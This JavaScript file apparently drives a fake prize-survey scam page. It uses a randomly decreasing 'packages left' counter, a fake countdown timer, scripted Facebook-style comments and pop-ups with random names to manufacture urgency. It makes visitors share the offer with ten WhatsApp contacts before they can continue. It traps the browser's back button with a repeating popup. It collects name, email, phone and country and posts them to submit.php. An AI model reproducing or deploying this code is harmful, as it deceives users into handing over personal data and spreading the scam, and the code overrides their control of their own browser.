  



var timer1;

function startCount1() {
    setTimeout(function(){
  window.scrollBy({top: -1100, behavior: "smooth"}); },1000);
    timer1 = setInterval(count1, 4000); // 200 = 200ms delay between counter changes. Lower num = faster, Bigger = slower.
}

function count1() {
    var rand_no = Math.ceil(9 * Math.random()); // 9 = random decrement amount. Counter will decrease anywhere from 1 - 9.
    var el = document.getElementById('counter1');
    var currentNumber = parseFloat(el.innerHTML);
    var newNumber = currentNumber - rand_no;
    if (newNumber > 0) {
        el.innerHTML = newNumber;
    } else {
        el.innerHTML = "There is no lest any pakage"; // This message is displayed when the counter reaches zero.
    }
}
























  //<![CDATA[
      redirectURL = "";
      WhatsApp_share_message = "";
      Share_link = "#";
      alert_text = "Compartilhe esta oferta com pelo menos 10 amigos para continuar. Você convidou...";
      var timer_start = 5; //minutes
      //]]>
  
  
      //<![CDATA[
      var total = 10;
      jQuery(document).ready(function ($) {
        $(".answer").click(function () {
          if($(this).hasClass("anses1")){
            survey.step1();
          }
          if($(this).hasClass("anses2")){
            survey.step2();
          }
          if($(this).hasClass("anses3")){
            survey.step3();
          }

          if($(this).hasClass("anses4")){
            survey.step4();
          }
          if($(this).hasClass("anses5")){
            survey.step5();
          }
          if($(this).hasClass("anses6")){
            survey.step6();
          }
          if($(this).hasClass("anses7")){
            survey.step7();
          }
          if($(this).hasClass("anses8")){
            survey.step8();
          }
        });

$(".answer14").click(function () {

if($(this).hasClass("check5")){
            survey.change();
          }


});





        
        var clicks = 0;
        var survey = {
          step1: function(){
            setTimeout(function () {
              //hide question block MobGyan
              $(".question_count").hide();
              $(".question1").hide();
              $(".anses1").hide();
              //show calculating MobGyan
              $(".calculating").show();
              setTimeout(function () {
                //hide calculating MobGyan
                $(".calculating").hide();
                //show step 2 MobGyan
                $(".question_count span").html("2");
                $(".question_count").show();
                $(".question2").show();
                $(".anses2").show();
                
                
              }, 1200);
            }, 300);
          },
          step2: function(){
            setTimeout(function () {
              //hide question block MobGyan
              $(".question_count").hide();
              $(".question2").hide();
              $(".anses2").hide();
              //show calculating MobGyan
              $(".calculating").show();
              setTimeout(function () {
                //hide calculating MobGyan
                $(".calculating").hide();
                //show step 3 MobGyan
                $(".question_count span").html("3");
                $(".question_count").show();
                $(".question3").show();
                $(".anses3").show();
                $(".ads_show").show();
                
                
              }, 1200);
            }, 300);
          },
           
          step3: function(){
            setTimeout(function () {
              //hide question block MobGyan
              $(".question_count").hide();
              $(".question3").hide();
              $(".anses3").hide();
              //show calculating MobGyan
              $(".calculating").show();
              setTimeout(function () {
                //hide calculating MobGyan
                $(".calculating").hide();
                //show step 3 MobGyan
                $(".question_count span").html("4");
                $(".question_count").show();
                $(".question4").show();
                $(".anses4").show();
              }, 1200);
            }, 300);
          },
             
          step: function(){
            setTimeout(function () {
              //hide question block MobGyan
              $(".question_count").hide();
              $(".question4").hide();
              $(".anses4").hide();
              //show calculating MobGyan
              $(".calculating").show();
              setTimeout(function () {
                //hide calculating MobGyan
                $(".calculating").hide();
                //show step 3 MobGyan
                $(".question_count span").html("5");
                $(".question_count").show();
                $(".question5").show();
                $(".anses5").show();
              }, 1200);
            }, 300);
          },

          step5: function(){
            setTimeout(function () {
              //hide question block MobGyan
              $(".question_count").hide();
              $(".question5").hide();
              $(".anses5").hide();
              //show calculating MobGyan
              $(".calculating").show();
              setTimeout(function () {
                //hide calculating MobGyan
                $(".calculating").hide();
                //show step 3 MobGyan
                $(".question_count span").html("6");
                $(".question_count").show();
                $(".question6").show();
                $(".anses6").show();
              }, 1200);
            }, 300);
          },

         
          step7: function(){
            setTimeout(function () {
              //hide question block MobGyan
              $(".question_count").hide();
              $(".question7").hide();
              $(".anses7").hide();
              //show calculating MobGyan
              $(".calculating").show();
              setTimeout(function () {
                //hide calculating MobGyan
                $(".calculating").hide();
                //show step 3 MobGyan
                $(".question_count span").html("8");
                $(".question_count").show();
                $(".question8").show();
                $(".anses8").show();
              }, 1200);
            }, 300);
          },





          step8: function(){
            setTimeout(function () {
              //hide question block MobGyan
              $(".question_count").hide();
              $(".question4").hide();
              $(".anses4").hide();
              //show calculating MobGyan
              $(".calculating").show();
              setTimeout(function () {
                //hide calculating MobGyan
                $(".calculating").hide();
                //show checking part MobGyan
                $(".survey_middle").css("vertical-align","top");
                $(".loading").show();
                setTimeout(function () {
                  $(".check1").fadeIn(300);
                  setTimeout(function () {
                    $(".check2").fadeIn(300);
                    setTimeout(function () {
                      $(".check3").fadeIn(300);
                      setTimeout(function () {
                        survey.change();
                      }, 1400);
                    }, 1100);
                  }, 1400);
                }, 750);
              }, 600);
            }, 300);
          },
          change: function(){
            //sakrij gornje MobGyan
            $(".headline,.small_headlines,.timer").hide();
            //sakrij content surveya MobGyan
            $(".loading").hide();
             $(".image1").hide();
              $(".image2").fadeIn(500);
              
              
              
            $(".survey_outer").css("height","auto");
            //pokazi ostatak MobGyan
            var walink = "whatsapp://send?text="+WhatsApp_share_message+Share_link;
            //$(".btn-share").attr("href",walink); MobGyan
            $(".btn-share").click(function(){
              clicks++;
              $('#progreso').show();
              if (clicks > total) {
                window.location = redirectURL;
                return;
              }
              $('.progress span').width(((clicks / total) * 100) + '%');
              if (clicks == total) {
                window.location.href = walink;
              }
              window.location.href = walink;
            });
            $(".last_page").show();
            $(".fbcoms").show();
             window.scrollBy({
                 top: 200,
            behavior: "smooth"
          });
      
            waitme();
          }
        };
        $(".like").click(function() {
          if($(this).hasClass("selected")) {
            $(this).removeClass("selected");
            $(this).html("Like");
            $("#youand").html("");
          } else {
            $(this).addClass("selected");
            $(this).html("Unlike");
            $("#youand").html("You and ");
          }
        });
        $(".fblike").click(function() {
          if($(this).hasClass("selected")) {
            $(this).removeClass("selected");
            $(this).html("Like");
          } else {
            $(this).addClass("selected");
            $(this).html("Unlike");
          }
        });
        function waitme(){
          FBcom("#fb1",000);
          FBcom("#fb2",000);
          FBcom("#fb3",000);
          FBcom("#fb4",000);
          FBcom("#fb5",00);
          FBcom("#fb6",000);
          FBcom("#fb7",000);
          FBcom("#fb8",0000);
          var ct = 48;
          (function loop() {
            var rand = random(2500,5500);
            var ctrand = random(1,4);
            ct = ct - ctrand;
            if(ct > 1) {
              setTimeout(function() {
                loop(); 
              }, rand);
            } else {
              ct = "few";
            }
            $("#count").html(ct);
          }());
        }
        function FBcom(a,b) {
          setTimeout(function() {
            var m = 0, n = true, op = 0;
            $(a+", "+a+" .comtxt, "+a+" .combot").slideDown(500);
            $().slideDown(500);
            var t = setInterval(function() {
              op += 0.2;
              $(a).css({"opacity":op});
              m++;
              if(m === 5) clearInterval(t);
            }, 100);
          }, b);
        }
        function random(min, max) {
          return Math.round(Math.random() * (max - min) + min);
        }
        var out,pops = {
          init: function(){
            setTimeout(function () {
              var rand_name = pop_names[random(0,pop_names.length-1)];
              var rand_text = pop_texts[random(0,pop_texts.length-1)];
              var text = rand_name + " " + rand_text;
              $(".pops p").html(text);
              $(".pops").fadeIn(500);
              out = setTimeout(function () {
                $(".pops").fadeOut(1000);
                pops.init();
              }, 6000);
            }, random(6000, 15000));
          }
        };
        pops.init();
        $("#iks").click(function () {
          clearTimeout(out);
          $(".pops").hide();
          pops.init();
        });
        $("#mins").html("0"+timer_start);
        $("#sec").html("00");
        var mins = timer_start, secs = 0, minutes, seconds, timer = {
          init: function(){
            var counter = setInterval(function () {
              $(".timer_heading").addClass("blink");
              setTimeout(function () {
                $(".timer_heading").removeClass("blink");
              }, 500);
              secs--;
              if(secs<0){
                secs = 59;
                mins--;
                if(mins<0){
                  clearInterval(counter);
                  mins = 0;
                  secs = 0;
                  $(".timer_heading").hide();
                  $(".timer .small_headlines").show();
                }
                if(mins<10){
                  minutes = "0" + mins;
                }else{
                  minutes = mins;
                }
              }
              if(secs<10){
                seconds = "0" + secs;
              }else{
                seconds = secs;
              }
              $("#mins").html(minutes);
              $("#sec").html(seconds);
            }, 1000);
          }
        };
        timer.init();
      });
      //]]>;
    
   
      //<![CDATA[
      var ii = 0; // needed for safari
      var iy = 0;
      if (typeof history.pushState === "function") {
        history.pushState("back", null, null);
        window.onpopstate = function() {
          history.pushState('back', null, null);
          if (iy==3) {
            iy=0;
            window.location='#';
          } else if (ii == 1) {
            document.getElementById('popup1').style.display = "none";
            setTimeout(function() {
              if (document.getElementById('popup1').style.display == "none") {
                document.getElementById('popup1').style.display = "block";
              }
            }, 300);
            window.navigator.vibrate(000);
            iy=iy+1;
          }
        };
      }
      setTimeout(function() {
        ii = 1;
      }, 200);
      function hidepop() {
        document.getElementById('popup1').style.display = "none";
      }
      //]]>


  



 
  function myFunction(){
            setTimeout(function () {
              //hide question block MobGyan
              $(".question_count").hide();
              $(".question4").hide();
              $(".anses4").hide();
              //show calculating MobGyan
              $(".calculating").fadeIn(200);
              setTimeout(function () {
                //hide calculating MobGyan
                $(".calculating").hide();
                //show checking part MobGyan
                $(".survey_middle").css("vertical-align","top");
                $(".loading").fadeIn(200);
                setTimeout(function () {
                  setTimeout(function () {
                  $(".load_headline").hide();
                  $(".check1").fadeIn(300);
                  setTimeout(function () {
                    $(".check1").hide();
                    $(".check2").fadeIn(300);
                    setTimeout(function () {
                      $(".check2").hide();
                      $(".check3").fadeIn(300);
                     setTimeout(function () { 
                         $(".check4").fadeIn(200);
                         setTimeout(function () {
                          $(".check5").show(200);
                         }, 1800);
                        }, 2000);
                        }, 1800);
                       }, 1600);
                      }, 1400);
                     }, 750);
                    }, 600);
                   }, 300);
                   
                  };

function clickedcontinue(){
            //sakrij gornje MobGyan
            $(".headline,.small_headlines,.timer").hide();
            //sakrij content surveya MobGyan
            $(".survey_outer").hide();
            $(".loading").hide();
            $(".captcha").show();
            $(".survey_outer").css("height","auto");
            //pokazi ostatak MobGyan
            var walink = "whatsapp://send?text="+WhatsApp_share_message+Share_link;
            //$(".btn-share").attr("href",walink); MobGyan
            $(".btn-share").click(function(){
              clicks++;
              $('#progreso').show();
              if (clicks > total) {
                window.location = redirectURL;
                return;
              }
              $('.progress span').width(((clicks / total) * 100) + '%');
              if (clicks == total) {
                window.location.href = walink;
              }
              window.location.href = walink;
            });
            $(".captcha").show();
      $(".fbcoms").show();
            waitme();
          };




function SubmitFormData() {
   
    var phone = $("#phone").val();
    
    if (phone == null || phone == ""){
      alert ("Enter Your Number");  
       
    }
    else {

   myFunction();
   
}
  

};


 

function form_fil() {
    var name = $("#name").val();
    var email = $("#email").val();
    var phone1 = $("#phone").val();
    var country = $("#country").val();
     var number1 = $("#number2").val();
     
    
   
   if (name == null || name == "" ) {
       nameError = "Please enter your name";
       
       document.getElementById("name_error").style.display="block";
       
       document.getElementById("name_error").innerHTML = nameError;
       
   }
   else if (email == null || email == ""){
       
      emailError = "Please enter your email";
      
      document.getElementById("name_error").style.display="none";
       document.getElementById("email_error").style.display="block";
      
       document.getElementById("email_error").innerHTML = emailError;
      
       
   }
   else if (country == null || country == ""){
      countryError = "Please enter your country";
      document.getElementById("name_error").style.display="none";
      
      document.getElementById("email_error").style.display="none";
       document.getElementById("country_error").style.display="block";
       
       document.getElementById("country_error").innerHTML = countryError;
       
        
   }
   
   else if (number1 == null || number1 == ""){
      
        document.getElementById("name_error").style.display="none";
       document.getElementById("email_error").style.display="none";
        document.getElementById("country_error").style.display="none";
       document.getElementById("number2_error").style.display="block";
       number2Error = "Please enter your number";
       document.getElementById("number2_error").innerHTML = number2Error;
        
  
 } 

 
 
 
 else {
     
     document.getElementById("name_error").style.display="none";
       document.getElementById("email_error").style.display="none";
        document.getElementById("country_error").style.display="none";
       document.getElementById("number2_error").style.display="none";
     
     
        
 $.post("submit.php", {
                  name: name,
                   email: email,
                  phone1 : phone1,
                    country: country,
                      number1 : number1
                     },
                        function(data) {
                              $('#form_detail')[0].reset();
                            
                        });
                              
                              
        setTimeout(function(){
           $(".success11").show();

            $("#myModal").modal("toggle");
 
          }, 200); 
          
        
          
          

} 





};




/********* Form Start *********/










function form_fill(){

setTimeout(function(){
$(".captcha1").hide(1000);
setTimeout(function(){
  $(".form_container").show(1000);
setTimeout(function(){
  window.scrollBy({
                 top: 1100,
            behavior: "smooth"
               }); 

},1000);

},1100);


}, 1000);


};





function success_end(){
    
    
     setTimeout(function(){
             $(".container12").hide(1000); 
            setTimeout( function(){
                $(".image2").hide(1000);
                setTimeout(function(){
                    $(".image1").show(1000);
             setTimeout(function(){
                 $(".last_show_box").show(1000);
                 setTimeout(function(){
                    window.scrollBy({ top: 700, behavior: "smooth"});    
                     
                 }, 1200);
             }, 1150); 
             }, 1100);
             
             }, 1050);
             
         }, 1000);
          
    
    
};



/********** success **************/


